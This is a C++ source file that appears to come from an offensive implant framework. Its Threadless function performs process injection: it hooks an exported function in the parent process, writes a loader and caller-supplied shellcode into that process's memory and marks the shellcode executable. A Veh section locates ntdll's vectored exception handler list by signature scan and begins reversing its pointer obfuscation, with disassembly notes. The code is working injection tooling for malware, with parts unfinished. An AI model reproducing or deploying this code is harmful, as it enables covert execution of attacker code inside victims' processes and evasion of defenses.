#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(_threadless threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
        HEXANE

        // todo: needs MmPivotRegion (Flower) :
        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]

        HANDLE process      = { };
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        if (!(ex_addr = Memory::Modules::GetExportAddress(S_CAST(LPSTR, threadless.Module.Buffer), R_CAST(LPSTR, threadless.Export.Buffer))) ||
            !(process = Process::GetParentHandle(R_CAST(PBYTE, threadless.Parent.Buffer))) ||
            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), cbShellcode))) {
            return;
        }

        auto loader_rva = hook - (ex_addr + 5);
        auto hook_p = hook;

        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &cbFullSize, PAGE_EXECUTE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
            return_defer(ntstatus);
        }
        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &cbFullSize, PAGE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
            return_defer(ntstatus);
        }

        //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), Shellcode, cbShellcode, &write)) || write != cbShellcode ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &cbShellcode, PAGE_EXECUTE_READ, nullptr))) {
            return_defer(ntstatus);
        }

        defer:
        if (process) {
            Ctx->Nt.NtClose(process);
        }
    }

    namespace Veh {

        LPVOID GetFirstHandler(wchar_t *name, const char *signature, const char *mask) {
            HEXANE

            LdrpVectorHandlerList *handlers = { };
            void *handler = { };
            uint32_t match = 0;

            const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(name, x_wcslen(name)));
            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
                return_defer(ERROR_INCORRECT_ADDRESS);
            }

            match += 0xD;
            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));

            if (
                !NT_SUCCESS(Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {

                handler = nullptr;
                return_defer(ntstatus);
            }

            defer:
            return handler;
        }

        LPVOID ObfuscatePointer(const void *target, const bool obfuscate) {
            HEXANE

            uintptr_t cookie = 0;
            void *pointer = { };

            /*
                ntdll.dll:770EB1BA mov     dword ptr [eax], 1
                ntdll.dll:770EB1C0 mov     eax, dword_771E65FC <- static value
                ntdll.dll:770EB1C5 test    eax, eax
                ntdll.dll:770EB1C7 jz      loc_7714D329

                ntdll.dll:7714D329
                ntdll.dll:7714D329 loc_7714D329:
                ntdll.dll:7714D329 push    ebx
                ntdll.dll:7714D32A push    4
                ntdll.dll:7714D32C lea     eax, [ebp+var_8]
                ntdll.dll:7714D32F push    eax
                ntdll.dll:7714D330 push    24h ; '$'
                ntdll.dll:7714D332 push    0FFFFFFFFh
                ntdll.dll:7714D334 call    near ptr ntdll_NtQueryInformationProcess
                ntdll.dll:7714D339 test    eax, eax
                ntdll.dll:7714D33B jns     short loc_7714D343
             */
            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                return_defer(ntstatus);
            }

            /*
                ntdll.dll:770EB1CD
                ntdll.dll:770EB1CD loc_770EB1CD:
                ntdll.dll:770EB1CD imul    ebx, [ebp+arg_0], 0Ch
                ntdll.dll:770EB1D1 mov     ecx, eax <- eax is the value returned by NtQueryInformationProcess : (PROCESSINFOCLASS)0x24
                ntdll.dll:770EB1D3 xor     eax, edi
                ntdll.dll:770EB1D5 and     ecx, 1Fh
                ntdll.dll:770EB1D8 ror     eax, cl
                ntdll.dll:770EB1DA push    0
                ntdll.dll:770EB1DC mov     [esi+10h], eax
                ntdll.dll:770EB1DF add     ebx, offset off_771E9340
                ntdll.dll:770EB1E5 lea     edi, [ebx+4]
                ntdll.dll:770EB1E8 call    near ptr unk_77122156
                ntdll.dll:770EB1ED push    dword ptr [ebx]
                ntdll.dll:770EB1EF call    near ptr ntdll_RtlAcquireSRWLockExclusive
                ntdll.dll:770EB1F4 cmp     [edi], edi
                ntdll.dll:770EB1F6 jnz     short loc_770EB20B

                eax = cookie
                ecx = eax
                ebx = [ebp+arg_0] * 0xC

                cookie ^ edi; cookie & 0x1F; cookie >> cl
                - need to find edi
                - need to find cl (cookie LSB)


                ntdll.dll:770EB136 mov     edi, edi
                ntdll.dll:770EB138 push    ebp
                ntdll.dll:770EB139 mov     ebp, esp
                ntdll.dll:770EB13B sub     esp, 0Ch
                ntdll.dll:770EB13E push    edi
                ntdll.dll:770EB13F mov     edi, edx

                edi is 2nd arguments to RtlAddVectoredHandler, which is the pointer to the user handler

                cookie ^ pointer; cookie & 0x1F; cookie >> (cookie-lsb) ??
             */

        defer:
            return pointer;
        }
    }
}
